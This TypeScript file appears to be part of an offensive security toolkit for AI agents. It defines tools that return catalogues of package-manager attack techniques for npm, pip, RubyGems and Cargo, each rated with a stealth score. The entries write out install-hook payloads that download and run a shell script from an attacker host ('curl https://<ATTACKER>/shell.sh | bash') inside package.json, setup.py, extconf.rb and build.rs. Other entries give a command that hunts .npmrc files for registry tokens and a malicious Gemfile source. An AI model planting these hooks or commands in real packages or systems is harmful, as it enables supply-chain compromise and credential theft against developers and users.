import { z } from "zod";
import type { ToolDef, ToolContext, ToolResult } from "../types/index.js";
import { json, text } from "../types/index.js";
import type { Platform } from "../schema/unified-entry.js";

function deduplicateByBinary(entries: any[]): any[] {
  const seen = new Set<string>();
  return entries.filter(e => {
    if (seen.has(e.id)) return false;
    seen.add(e.id);
    return true;
  });
}

function summarizeKbEntry(e: any): Record<string, unknown> {
  return {
    id: e.id, binary: e.binary, platform: e.platform, catalog: e.catalogSource,
    functions: e.functions, stealth_score: e.stealthScore, description: e.description,
    attck_techniques: e.attckTechniques,
  };
}

interface PkgTechnique {
  technique: string;
  description: string;
  package_manager: string;
  config_file: string;
  command: string;
  stealth_score: number;
  attck_ids: string[];
  prerequisites: string[];
  detection_notes: string;
}

// ── pkg_npm_hooks ─────────────────────────────────────────────────────────────

const pkg_npm_hooks: ToolDef = {
  name: "pkg_npm_hooks",
  description: "Find npm lifecycle hook abuse techniques — preinstall, postinstall, prepare scripts for code execution",
  schema: {
    target_registry: z.string().optional().describe("Target npm registry URL"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword("npm"));

    const techniques: PkgTechnique[] = [
      {
        technique: "npm preinstall hook",
        description: "Execute arbitrary commands during npm install via preinstall lifecycle hook in package.json",
        package_manager: "npm", config_file: "package.json",
        command: '{"scripts":{"preinstall":"curl https://<ATTACKER>/shell.sh | bash"}}',
        stealth_score: 3, attck_ids: ["T1059", "T1195.001"],
        prerequisites: ["Writable package.json or malicious package dependency"],
        detection_notes: "Monitor npm install processes. Audit package.json scripts field.",
      },
      {
        technique: "npm postinstall hook",
        description: "Execute code after npm package installation via postinstall hook",
        package_manager: "npm", config_file: "package.json",
        command: '{"scripts":{"postinstall":"node -e \\"require(\'child_process\').execSync(\'whoami\')\\"}}',
        stealth_score: 3, attck_ids: ["T1059", "T1195.001"],
        prerequisites: ["Writable package.json or malicious dependency"],
        detection_notes: "Audit postinstall scripts. npm install --ignore-scripts bypasses.",
      },
      {
        technique: "npm .npmrc credential theft",
        description: "Read .npmrc files for registry auth tokens",
        package_manager: "npm", config_file: ".npmrc",
        command: 'cat ~/.npmrc && find / -name ".npmrc" -readable 2>/dev/null',
        stealth_score: 2, attck_ids: ["T1552.001"],
        prerequisites: ["Read access to home directories"],
        detection_notes: "Monitor reads on .npmrc files containing auth tokens.",
      },
    ];

    return json({ package_manager: "npm", total_techniques: techniques.length, techniques, kb_entries: kbEntries.slice(0, 5).map(summarizeKbEntry) });
  },
};

// ── pkg_pip_setup ─────────────────────────────────────────────────────────────

const pkg_pip_setup: ToolDef = {
  name: "pkg_pip_setup",
  description: "Find pip/setup.py code execution techniques — setup.py install hooks, requirements.txt poisoning",
  schema: {
    target_registry: z.string().optional().describe("Target PyPI registry URL"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const kbEntries = deduplicateByBinary(ctx.knowledgeBase.searchByKeyword("pip"));

    const techniques: PkgTechnique[] = [
      {
        technique: "setup.py code execution",
        description: "Execute arbitrary Python code during pip install via malicious setup.py",
        package_manager: "pip", config_file: "setup.py",
        command: 'import os; os.system("curl https://<ATTACKER>/shell.sh | bash")  # in setup.py install cmdclass',
        stealth_score: 3, attck_ids: ["T1059.006", "T1195.001"],
        prerequisites: ["pip install on malicious package"],
        detection_notes: "Monitor pip install spawning shells. Audit setup.py.",
      },
      {
        technique: "requirements.txt dependency confusion",
        description: "Exploit dependency confusion by registering internal package names on public PyPI",
        package_manager: "pip", config_file: "requirements.txt",
        command: "# Register higher-version package on pypi.org with same name as internal package",
        stealth_score: 2, attck_ids: ["T1195.001"],
        prerequisites: ["Knowledge of internal package names"],
        detection_notes: "Monitor pip install sources. Use --index-url for private registry.",
      },
    ];

    return json({ package_manager: "pip", total_techniques: techniques.length, techniques, kb_entries: kbEntries.slice(0, 5).map(summarizeKbEntry) });
  },
};

// ── pkg_gem_hooks ─────────────────────────────────────────────────────────────

const pkg_gem_hooks: ToolDef = {
  name: "pkg_gem_hooks",
  description: "Find Ruby gem build/install hook abuse techniques for code execution during gem installation",
  schema: {
    target_registry: z.string().optional().describe("Target gem registry URL"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const techniques: PkgTechnique[] = [
      {
        technique: "gem ext_conf.rb code execution",
        description: "Execute Ruby code during gem install via native extension build (extconf.rb)",
        package_manager: "gem", config_file: "extconf.rb",
        command: '# extconf.rb: system("curl https://<ATTACKER>/shell.sh | bash")',
        stealth_score: 2, attck_ids: ["T1059", "T1195.001"],
        prerequisites: ["gem install on malicious package with native extensions"],
        detection_notes: "Monitor gem install spawning shells. Audit extconf.rb.",
      },
      {
        technique: "Gemfile source manipulation",
        description: "Add malicious gem source to Gemfile for dependency hijacking",
        package_manager: "gem", config_file: "Gemfile",
        command: '# Gemfile: source "https://evil-gems.com"',
        stealth_score: 2, attck_ids: ["T1195.001"],
        prerequisites: ["Write access to Gemfile"],
        detection_notes: "Audit Gemfile sources.",
      },
    ];

    return json({ package_manager: "gem", total_techniques: techniques.length, techniques });
  },
};

// ── pkg_cargo_build ───────────────────────────────────────────────────────────

const pkg_cargo_build: ToolDef = {
  name: "pkg_cargo_build",
  description: "Find Cargo build script (build.rs) abuse techniques for code execution during Rust package compilation",
  schema: {
    target_registry: z.string().optional().describe("Target crates.io or alternative registry"),
  },
  async execute(args: any, ctx: ToolContext): Promise<ToolResult> {
    const techniques: PkgTechnique[] = [
      {
        technique: "Cargo build.rs code execution",
        description: "Execute arbitrary Rust code during cargo build via build.rs build script",
        package_manager: "cargo", config_file: "build.rs",
        command: '// build.rs: std::process::Command::new("sh").arg("-c").arg("curl https://<ATTACKER>/s.sh | bash").output();',
        stealth_score: 2, attck_ids: ["T1059", "T1195.001"],
        prerequisites: ["cargo build on malicious crate with build.rs"],
        detection_notes: "Monitor cargo build spawning non-Rust processes.",
      },
      {
        technique: "Cargo proc-macro code execution",
        description: "Execute code at compile time via procedural macros in Rust dependencies",
        package_manager: "cargo", config_file: "lib.rs",
        command: "// proc_macro: compile-time code execution during macro expansion",
        stealth_score: 1, attck_ids: ["T1059", "T1195.001"],
        prerequisites: ["Dependency using proc-macro crate type"],
        detection_notes: "Audit proc-macro dependencies. Sandbox cargo builds.",
      },
    ];

    return json({ package_manager: "cargo", total_techniques: techniques.length, techniques });
  },
};

// ── Export ─────────────────────────────────────────────────────────────────────

export const packageManagerTools: ToolDef[] = [
  pkg_npm_hooks,
  pkg_pip_setup,
  pkg_gem_hooks,
  pkg_cargo_build,
];
